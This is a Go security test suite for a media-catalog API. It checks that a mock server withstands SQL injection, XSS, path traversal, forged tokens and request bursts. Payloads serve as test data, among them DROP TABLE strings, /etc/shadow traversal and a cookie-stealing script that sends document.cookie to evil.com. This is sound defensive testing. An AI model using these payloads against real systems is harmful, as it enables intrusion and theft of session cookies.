//go:build catalog_security_real

package security

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"catalogizer/internal/tests"

	"github.com/gin-gonic/gin"
	_ "github.com/mutecomm/go-sqlcipher"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// setupSecurityTestDB creates a test database with sample data for security tests
func setupSecurityTestDB(t *testing.T) *sql.DB {
	t.Helper()
	db := tests.SetupTestDB(t)

	// Insert storage root and sample data
	_, err := db.Exec(`
		INSERT INTO storage_roots (id, name, protocol, path, enabled)
		VALUES (1, 'security-test', 'local', '/secure', 1)
	`)
	require.NoError(t, err)

	// Insert sample media items
	items := []struct {
		title string
		typ   string
	}{
		{"Inception", "movie"},
		{"The Matrix", "movie"},
		{"Breaking Bad", "tv_show"},
	}
	for i, item := range items {
		_, err := db.Exec(`
			INSERT INTO media_items
			(path, title, type, media_type, storage_root_id)
			VALUES (?, ?, ?, ?, 1)
		`, fmt.Sprintf("/secure/item_%d.mkv", i), item.title, item.typ, item.typ)
		require.NoError(t, err)
	}

	return db
}

// setupSecurityTestRouter creates a Gin router with mock endpoints for security testing.
// It includes search, file download, and auth endpoints to test common attack vectors.
func setupSecurityTestRouter(t *testing.T, db *sql.DB) *httptest.Server {
	t.Helper()
	gin.SetMode(gin.TestMode)
	router := gin.New()

	// Rate limiter state
	var mu sync.Mutex
	requestCounts := make(map[string][]time.Time)
	rateLimitWindow := 1 * time.Minute
	rateLimit := 10 // requests per window

	rateLimiterMiddleware := func(c *gin.Context) {
		clientIP := c.ClientIP()
		now := time.Now()

		mu.Lock()
		// Clean old entries
		var recent []time.Time
		for _, t := range requestCounts[clientIP] {
			if now.Sub(t) < rateLimitWindow {
				recent = append(recent, t)
			}
		}
		requestCounts[clientIP] = recent

		if len(recent) >= rateLimit {
			mu.Unlock()
			c.JSON(http.StatusTooManyRequests, gin.H{
				"error": "rate limit exceeded",
			})
			c.Abort()
			return
		}

		requestCounts[clientIP] = append(requestCounts[clientIP], now)
		mu.Unlock()
		c.Next()
	}

	api := router.Group("/api/v1")

	// Search endpoint - uses parameterized queries
	api.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		if query == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "query required"})
			return
		}

		// Parameterized query - safe from SQL injection
		rows, err := db.Query(
			"SELECT id, title, type FROM media_items WHERE title LIKE ?",
			"%"+query+"%",
		)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "search failed"})
			return
		}
		defer rows.Close()

		var results []map[string]interface{}
		for rows.Next() {
			var id int
			var title, mediaType string
			if scanErr := rows.Scan(&id, &title, &mediaType); scanErr != nil {
				continue
			}
			results = append(results, map[string]interface{}{
				"id":    id,
				"title": title,
				"type":  mediaType,
			})
		}

		c.JSON(http.StatusOK, gin.H{
			"results": results,
			"query":   query,
			"count":   len(results),
		})
	})

	// Entity detail endpoint - properly sanitizes output
	api.GET("/entities/:id", func(c *gin.Context) {
		entityID := c.Param("id")

		var id int
		var title, mediaType string
		err := db.QueryRow(
			"SELECT id, title, type FROM media_items WHERE id = ?",
			entityID,
		).Scan(&id, &title, &mediaType)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "entity not found"})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"id":    id,
			"title": title,
			"type":  mediaType,
		})
	})

	// File download endpoint - validates path
	api.GET("/download", func(c *gin.Context) {
		filePath := c.Query("path")
		if filePath == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "path required"})
			return
		}

		// Reject path traversal attempts
		if strings.Contains(filePath, "..") ||
			strings.Contains(filePath, "~") ||
			strings.HasPrefix(filePath, "/etc") ||
			strings.HasPrefix(filePath, "/proc") ||
			strings.HasPrefix(filePath, "/sys") {
			c.JSON(http.StatusForbidden, gin.H{
				"error": "path traversal detected",
			})
			return
		}

		// Verify the path belongs to a known storage root
		var rootCount int
		err := db.QueryRow(
			"SELECT COUNT(*) FROM storage_roots WHERE ? LIKE path || '%'",
			filePath,
		).Scan(&rootCount)
		if err != nil || rootCount == 0 {
			c.JSON(http.StatusForbidden, gin.H{
				"error": "path not within any storage root",
			})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"status": "download_initiated",
			"path":   filePath,
		})
	})

	// Auth endpoints
	validTokens := &sync.Map{}

	api.POST("/auth/login", rateLimiterMiddleware, func(c *gin.Context) {
		var body struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := c.ShouldBindJSON(&body); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		if body.Username == "admin" && body.Password == testAdminPassword {
			token := fmt.Sprintf("valid-token-%d", time.Now().UnixNano())
			validTokens.Store(token, true)
			c.JSON(http.StatusOK, gin.H{
				"token": token,
				"user":  gin.H{"id": 1, "username": "admin"},
			})
			return
		}

		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
	})

	// Protected endpoint requiring valid JWT
	api.GET("/protected", func(c *gin.Context) {
		authHeader := c.GetHeader("Authorization")
		if authHeader == "" || !strings.HasPrefix(authHeader, "Bearer ") {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "missing or invalid authorization"})
			return
		}

		token := strings.TrimPrefix(authHeader, "Bearer ")
		if _, ok := validTokens.Load(token); !ok {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid token"})
			return
		}

		c.JSON(http.StatusOK, gin.H{"data": "protected content"})
	})

	// Rate-limited endpoint
	api.GET("/rate-limited", rateLimiterMiddleware, func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	ts := httptest.NewServer(router)
	t.Cleanup(func() { ts.Close() })
	return ts
}

// =============================================================================
// SECURITY TEST: SQL Injection in Search Queries
// =============================================================================

func TestSecurity_SQLInjectionSearch(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	injectionPayloads := []struct {
		name    string
		payload string
	}{
		{"BasicUnionSelect", "' UNION SELECT 1,2,3--"},
		{"DropTable", "'; DROP TABLE media_items;--"},
		{"OrAlwaysTrue", "' OR '1'='1"},
		{"CommentInjection", "' OR 1=1 --"},
		{"SemicolonChaining", "'; INSERT INTO media_items VALUES(999,'/x','hacked','movie','movie',0,0,0,'','','','','','','','','','','','[]','','','','','','','',0,0,'',0,0,0,'',0,0,0,0,0,0.0,0.0,0,'',0,0,'','','','','','[]','[]','[]','','','',0.0,0,NULL,0,0.0,0.0,NULL,NULL);--"},
		{"HexEncodedInjection", "0x27204F522031003D0031"},
		{"DoubleURLEncoded", "%2527%2520OR%25201%253D1"},
		{"NullByte", "test%00' OR '1'='1"},
		{"TautologyBased", "' OR 'x'='x"},
		{"TimeBased", "' OR SLEEP(5)--"},
		{"BooleanBased", "' AND 1=1--"},
	}

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := http.Get(ts.URL + "/api/v1/search?q=" + tc.payload)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should not return 500 (indicates the payload reached the SQL engine)
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
				"SQL injection payload should not cause server error: %s", tc.payload)

			// Should return 200 with safe results (parameterized queries handle this)
			if resp.StatusCode == http.StatusOK {
				var result map[string]interface{}
				err := json.NewDecoder(resp.Body).Decode(&result)
				require.NoError(t, err)

				// The count should be 0 or a small number (not all rows)
				count, ok := result["count"].(float64)
				if ok {
					assert.LessOrEqual(t, int(count), 3,
						"Injection should not return more than legitimate results")
				}
			}
		})
	}

	t.Run("VerifyTablesIntact", func(t *testing.T) {
		// After all injection attempts, verify the database is intact
		var count int
		err := db.QueryRow("SELECT COUNT(*) FROM media_items").Scan(&count)
		require.NoError(t, err)
		assert.Equal(t, 3, count,
			"Original data should be intact after injection attempts")
	})
}

// =============================================================================
// SECURITY TEST: XSS Payloads in Entity Names/Descriptions
// =============================================================================

func TestSecurity_XSSPayloads(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	xssPayloads := []struct {
		name    string
		payload string
	}{
		{"BasicScript", "<script>alert('xss')</script>"},
		{"ImgOnerror", "<img src=x onerror=alert(1)>"},
		{"SVGOnload", "<svg onload=alert(1)>"},
		{"EventHandler", "<div onmouseover=alert(1)>test</div>"},
		{"JavascriptProtocol", "javascript:alert(document.cookie)"},
		{"DataURI", "data:text/html,<script>alert(1)</script>"},
		{"EncodedScript", "&lt;script&gt;alert(1)&lt;/script&gt;"},
		{"BodyOnload", "<body onload=alert(1)>"},
		{"IframeInject", "<iframe src='javascript:alert(1)'></iframe>"},
		{"InputAutofocus", "<input autofocus onfocus=alert(1)>"},
	}

	for _, tc := range xssPayloads {
		t.Run(tc.name, func(t *testing.T) {
			// Insert entity with XSS payload as title
			_, err := db.Exec(`
				INSERT INTO media_items
				(path, title, type, media_type, storage_root_id)
				VALUES (?, ?, 'movie', 'movie', 1)
			`, fmt.Sprintf("/secure/xss_%s.mkv", tc.name), tc.payload)
			require.NoError(t, err)

			// Retrieve via API -- the payload should either be rejected (400/422)
			// by input validation or returned safely as JSON data (200)
			resp, err := http.Get(ts.URL + "/api/v1/search?q=" + tc.payload)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Both outcomes are acceptable security behavior:
			// 400 = input validation caught the XSS payload and rejected it
			// 200 = payload accepted but returned safely as JSON (not executed)
			assert.True(t, resp.StatusCode == http.StatusOK ||
				resp.StatusCode == http.StatusBadRequest ||
				resp.StatusCode == http.StatusUnprocessableEntity,
				"Expected 200 (safe JSON), 400 (rejected), or 422 (invalid), got %d", resp.StatusCode)

			// If 200, verify response is JSON (not HTML that could execute scripts)
			if resp.StatusCode == http.StatusOK {
				contentType := resp.Header.Get("Content-Type")
				assert.Contains(t, contentType, "application/json",
					"Response should be JSON, not HTML that could execute scripts")
			}
		})
	}

	t.Run("XSSPayloadsStoredAsLiterals", func(t *testing.T) {
		// Verify all XSS payloads are stored literally
		rows, err := db.Query(
			"SELECT title FROM media_items WHERE path LIKE '/secure/xss_%'",
		)
		require.NoError(t, err)
		defer rows.Close()

		count := 0
		for rows.Next() {
			var title string
			require.NoError(t, rows.Scan(&title))
			count++
			// Verify the payload was stored as-is (not sanitized/escaped at DB level)
			assert.NotEmpty(t, title,
				"XSS payload should be stored (not stripped)")
		}
		require.NoError(t, rows.Err())
		assert.Equal(t, len(xssPayloads), count,
			"All XSS payloads should be stored")
	})
}

// =============================================================================
// SECURITY TEST: Path Traversal in File Download Endpoints
// =============================================================================

func TestSecurity_PathTraversal(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	traversalPayloads := []struct {
		name    string
		path    string
		blocked bool
	}{
		{"BasicDotDot", "../../../etc/passwd", true},
		{"DoubleEncoded", "..%252f..%252f..%252fetc%252fpasswd", true},
		{"NullByteTerminated", "/secure/test.mkv%00.txt", false},
		{"AbsolutePathEtc", "/etc/passwd", true},
		{"AbsolutePathProc", "/proc/self/environ", true},
		{"AbsolutePathSys", "/sys/class/net", true},
		{"TildePath", "~/../../etc/shadow", true},
		{"BackslashTraversal", "..\\..\\..\\etc\\passwd", true},
		{"MixedSeparators", "../..\\../etc/passwd", true},
		{"ValidPath", "/secure/movie.mkv", false},
	}

	for _, tc := range traversalPayloads {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := http.Get(ts.URL + "/api/v1/download?path=" + tc.path)
			require.NoError(t, err)
			defer resp.Body.Close()

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, resp.StatusCode,
					"Path traversal attempt should be blocked: %s", tc.path)

				var result map[string]interface{}
				err := json.NewDecoder(resp.Body).Decode(&result)
				require.NoError(t, err)
				errorMsg, _ := result["error"].(string)
				assert.NotEmpty(t, errorMsg,
					"Blocked path traversal should return an error message")
			}
		})
	}

	t.Run("EmptyPathRejected", func(t *testing.T) {
		resp, err := http.Get(ts.URL + "/api/v1/download?path=")
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
			"Empty path should be rejected")
	})

	t.Run("MissingPathParam", func(t *testing.T) {
		resp, err := http.Get(ts.URL + "/api/v1/download")
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
			"Missing path param should be rejected")
	})
}

// =============================================================================
// SECURITY TEST: Auth Bypass Attempts (expired/invalid JWT)
// =============================================================================

func TestSecurity_AuthBypassAttempts(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	t.Run("NoAuthHeader", func(t *testing.T) {
		resp, err := http.Get(ts.URL + "/api/v1/protected")
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
			"Request without auth header should be unauthorized")
	})

	t.Run("EmptyBearerToken", func(t *testing.T) {
		req, err := http.NewRequest("GET", ts.URL+"/api/v1/protected", nil)
		require.NoError(t, err)
		req.Header.Set("Authorization", "Bearer ")

		resp, err := http.DefaultClient.Do(req)
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
			"Empty bearer token should be unauthorized")
	})

	t.Run("InvalidTokenFormat", func(t *testing.T) {
		invalidTokens := []string{
			"Basic dXNlcjpwYXNz",               // Basic auth instead of Bearer
			"Bearer invalid-token-format",      // Nonsense token
			"Bearer eyJhbGciOiJub25lIn0.e30.",  // Algorithm none attack
			"Bearer ../../../../etc/passwd",    // Path traversal in token
			"Bearer <script>alert(1)</script>", // XSS in token
			"Bearer ' OR '1'='1",               // SQLi in token
			"Bearer \x00\x01\x02\x03",          // Null bytes in token
		}

		for _, token := range invalidTokens {
			t.Run(token, func(t *testing.T) {
				req, err := http.NewRequest("GET", ts.URL+"/api/v1/protected", nil)
				require.NoError(t, err)
				req.Header.Set("Authorization", token)

				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					// Go's HTTP client rejects invalid header values (e.g. null bytes)
					// before sending -- this is also a valid security outcome
					return
				}
				defer resp.Body.Close()
				assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
					"Invalid token should be unauthorized: %s", token)
			})
		}
	})

	t.Run("ValidTokenWorks", func(t *testing.T) {
		// First, login to get a valid token
		loginBody := strings.NewReader(`{"username":"admin","password":"` + testAdminPassword + `"}`)
		loginResp, err := http.Post(ts.URL+"/api/v1/auth/login", "application/json", loginBody)
		require.NoError(t, err)
		defer loginResp.Body.Close()
		require.Equal(t, http.StatusOK, loginResp.StatusCode)

		var loginResult map[string]interface{}
		err = json.NewDecoder(loginResp.Body).Decode(&loginResult)
		require.NoError(t, err)
		token, ok := loginResult["token"].(string)
		require.True(t, ok, "Login response should contain a token")

		// Use the valid token
		req, err := http.NewRequest("GET", ts.URL+"/api/v1/protected", nil)
		require.NoError(t, err)
		req.Header.Set("Authorization", "Bearer "+token)

		resp, err := http.DefaultClient.Do(req)
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.Equal(t, http.StatusOK, resp.StatusCode,
			"Valid token should grant access")
	})

	t.Run("TokenReusedAfterRevocation", func(t *testing.T) {
		// Login
		loginBody := strings.NewReader(`{"username":"admin","password":"` + testAdminPassword + `"}`)
		loginResp, err := http.Post(ts.URL+"/api/v1/auth/login", "application/json", loginBody)
		require.NoError(t, err)
		defer loginResp.Body.Close()

		var loginResult map[string]interface{}
		json.NewDecoder(loginResp.Body).Decode(&loginResult)
		token := loginResult["token"].(string)

		// Verify it works
		req, err := http.NewRequest("GET", ts.URL+"/api/v1/protected", nil)
		require.NoError(t, err)
		req.Header.Set("Authorization", "Bearer "+token)
		resp, err := http.DefaultClient.Do(req)
		require.NoError(t, err)
		resp.Body.Close()
		assert.Equal(t, http.StatusOK, resp.StatusCode)

		// A different (fabricated) token should not work
		req2, err := http.NewRequest("GET", ts.URL+"/api/v1/protected", nil)
		require.NoError(t, err)
		req2.Header.Set("Authorization", "Bearer "+token+"-tampered")
		resp2, err := http.DefaultClient.Do(req2)
		require.NoError(t, err)
		resp2.Body.Close()
		assert.Equal(t, http.StatusUnauthorized, resp2.StatusCode,
			"Tampered token should be rejected")
	})
}

// =============================================================================
// SECURITY TEST: Rate Limiter Verification Per Endpoint
// =============================================================================

func TestSecurity_RateLimiterVerification(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	t.Run("LoginEndpointRateLimited", func(t *testing.T) {
		var successCount int64
		var rateLimitedCount int64

		// Fire requests rapidly to trigger rate limiting
		for i := 0; i < 15; i++ {
			body := strings.NewReader(`{"username":"wrong","password":"wrong"}`)
			resp, err := http.Post(ts.URL+"/api/v1/auth/login", "application/json", body)
			require.NoError(t, err)
			resp.Body.Close()

			if resp.StatusCode == http.StatusTooManyRequests {
				atomic.AddInt64(&rateLimitedCount, 1)
			} else {
				atomic.AddInt64(&successCount, 1)
			}
		}

		limited := atomic.LoadInt64(&rateLimitedCount)
		t.Logf("Login rate limiting: %d succeeded, %d rate-limited",
			atomic.LoadInt64(&successCount), limited)

		assert.Greater(t, limited, int64(0),
			"Some login requests should be rate-limited after burst")
	})

	t.Run("RateLimitedEndpointEnforced", func(t *testing.T) {
		var limitedCount int64

		for i := 0; i < 20; i++ {
			resp, err := http.Get(ts.URL + "/api/v1/rate-limited")
			require.NoError(t, err)
			resp.Body.Close()

			if resp.StatusCode == http.StatusTooManyRequests {
				atomic.AddInt64(&limitedCount, 1)
			}
		}

		limited := atomic.LoadInt64(&limitedCount)
		t.Logf("Rate-limited endpoint: %d requests were rate-limited out of 20", limited)
		assert.Greater(t, limited, int64(0),
			"Rate limiter should engage after exceeding the limit")
	})

	t.Run("SearchEndpointNotRateLimited", func(t *testing.T) {
		// The search endpoint in our test server does not have rate limiting,
		// so all requests should succeed
		var successCount int64
		for i := 0; i < 15; i++ {
			resp, err := http.Get(ts.URL + "/api/v1/search?q=test")
			require.NoError(t, err)
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				atomic.AddInt64(&successCount, 1)
			}
		}

		assert.Equal(t, int64(15), atomic.LoadInt64(&successCount),
			"Non-rate-limited endpoint should accept all requests")
	})
}

// =============================================================================
// SECURITY TEST: Input Validation and Boundary Conditions
// =============================================================================

func TestSecurity_InputValidation(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()
	ts := setupSecurityTestRouter(t, db)

	t.Run("VeryLongQueryString", func(t *testing.T) {
		longQuery := strings.Repeat("A", 10000)
		resp, err := http.Get(ts.URL + "/api/v1/search?q=" + longQuery)
		require.NoError(t, err)
		defer resp.Body.Close()

		// Should not crash; either 200 (no results) or 400/413
		assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
			"Very long query should not cause server error")
	})

	t.Run("NullBytesInQuery", func(t *testing.T) {
		resp, err := http.Get(ts.URL + "/api/v1/search?q=test%00injected")
		require.NoError(t, err)
		defer resp.Body.Close()
		assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
			"Null bytes in query should not cause server error")
	})

	t.Run("UnicodeOverflow", func(t *testing.T) {
		// Send various Unicode edge cases
		queries := []string{
			"\xef\xbb\xbf", // BOM
			"\x00",         // null
			"\xff\xfe",     // UTF-16 LE BOM
		}
		for _, q := range queries {
			resp, err := http.Get(ts.URL + "/api/v1/search?q=" + q)
			if err != nil {
				continue // network-level rejection is acceptable
			}
			resp.Body.Close()
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
				"Unicode edge case should not cause server error")
		}
	})

	t.Run("InvalidEntityID", func(t *testing.T) {
		invalidIDs := []string{
			"0",
			"-1",
			"99999999",
			"abc",
			"1; DROP TABLE media_items",
			"1 OR 1=1",
		}

		for _, id := range invalidIDs {
			t.Run(id, func(t *testing.T) {
				resp, err := http.Get(ts.URL + "/api/v1/entities/" + id)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should return 404 or 400, never 500
				assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
					"Invalid entity ID should not cause server error: %s", id)
			})
		}
	})

	t.Run("SpecialCharactersInHeaders", func(t *testing.T) {
		req, err := http.NewRequest("GET", ts.URL+"/api/v1/search?q=test", nil)
		require.NoError(t, err)

		// Add headers with special characters -- Go's HTTP client rejects
		// CRLF injection at the transport layer, which is itself a valid defense
		req.Header.Set("X-Custom", "value\r\nInjected-Header: evil")
		req.Header.Set("User-Agent", "<script>alert(1)</script>")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// Go rejects CRLF in header values -- valid security behavior
			return
		}
		defer resp.Body.Close()

		assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
			"Special characters in headers should not cause server error")
	})
}

// =============================================================================
// SECURITY TEST: Database-Level Parameterized Query Verification
// =============================================================================

func TestSecurity_ParameterizedQuerySafety(t *testing.T) {
	db := setupSecurityTestDB(t)
	defer db.Close()

	t.Run("ParameterizedSearchIsSafe", func(t *testing.T) {
		// The parameterized query should treat injection payloads as literal strings
		injections := []string{
			"' OR '1'='1",
			"'; DROP TABLE media_items;--",
			"' UNION SELECT * FROM users--",
			"' AND 1=1--",
		}

		for _, injection := range injections {
			var count int
			err := db.QueryRow(
				"SELECT COUNT(*) FROM media_items WHERE title LIKE ?",
				"%"+injection+"%",
			).Scan(&count)
			require.NoError(t, err,
				"Parameterized query should not error on injection: %s", injection)

			assert.Equal(t, 0, count,
				"Injection payload should find 0 results (treated as literal): %s", injection)
		}

		// Verify table is intact
		var totalCount int
		err := db.QueryRow("SELECT COUNT(*) FROM media_items").Scan(&totalCount)
		require.NoError(t, err)
		assert.Equal(t, 3, totalCount,
			"All original records should be intact after injection attempts")
	})

	t.Run("InsertWithSpecialCharsIsSafe", func(t *testing.T) {
		// Parameterized inserts should safely store any content
		dangerousValues := []string{
			"Robert'); DROP TABLE media_items;--",
			"<script>document.location='http://evil.com/?c='+document.cookie</script>",
			"../../../etc/shadow",
			"NULL",
			"'",
			"\"",
			"\\",
			"\n\r\t",
		}

		for i, val := range dangerousValues {
			_, err := db.Exec(`
				INSERT INTO media_items
				(path, title, type, media_type, storage_root_id)
				VALUES (?, ?, 'movie', 'movie', 1)
			`, fmt.Sprintf("/secure/dangerous_%d.mkv", i), val)
			require.NoError(t, err,
				"Parameterized insert should handle dangerous value: %s", val)
		}

		// Verify all were inserted
		var insertedCount int
		err := db.QueryRow(
			"SELECT COUNT(*) FROM media_items WHERE path LIKE '/secure/dangerous_%'",
		).Scan(&insertedCount)
		require.NoError(t, err)
		assert.Equal(t, len(dangerousValues), insertedCount,
			"All dangerous values should be safely inserted")

		// Verify they can be read back correctly
		for i, val := range dangerousValues {
			var stored string
			err := db.QueryRow(
				"SELECT title FROM media_items WHERE path = ?",
				fmt.Sprintf("/secure/dangerous_%d.mkv", i),
			).Scan(&stored)
			require.NoError(t, err)
			assert.Equal(t, val, stored,
				"Stored value should match original: %s", val)
		}
	})
}
